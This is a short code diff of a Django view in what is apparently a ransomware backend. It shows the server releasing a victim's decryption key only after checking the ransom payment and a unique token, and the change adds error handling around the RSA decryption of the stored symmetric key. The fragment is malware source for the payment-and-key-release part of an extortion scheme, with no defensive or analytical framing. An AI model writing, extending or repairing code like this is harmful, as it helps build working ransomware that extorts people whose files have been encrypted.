@@ -90,15 +90,17 @@ def recieve_private_key(request):
         
         if key_store.paid_status == False:
             return HttpResponseNotFound("Ransom not paid")
-        
-        if request.GET.get("uniqueToken", None) == key_store.unique_email_token and key_store.paid_status == True:
-            private_rsa_key = key_store.private_key
-            encrypted_sim_key = b64decode(key_store.encrypted_symetric_key)
-            print(encrypted_sim_key)
-            rsa_key = RSA.importKey(private_rsa_key)
-            cipher = PKCS1_OAEP.new(rsa_key)
-            cipher_decrypt_key = cipher.decrypt(encrypted_sim_key)
-            return JsonResponse({"sim_key": cipher_decrypt_key.decode(encoding='utf8')})
+        try:
+            if request.GET.get("uniqueToken", None) == key_store.unique_email_token and key_store.paid_status == True:
+                private_rsa_key = key_store.private_key
+                encrypted_sim_key = b64decode(key_store.encrypted_symetric_key)
+                print(encrypted_sim_key)
+                rsa_key = RSA.importKey(private_rsa_key)
+                cipher = PKCS1_OAEP.new(rsa_key)
+                cipher_decrypt_key = cipher.decrypt(encrypted_sim_key)
+                return JsonResponse({"sim_key": cipher_decrypt_key.decode(encoding='utf8')})
+        except:
+            return HttpResponseNotFound("Error on getting the simmetric key")
         
     return HttpResponseNotFound("Not Found")
         
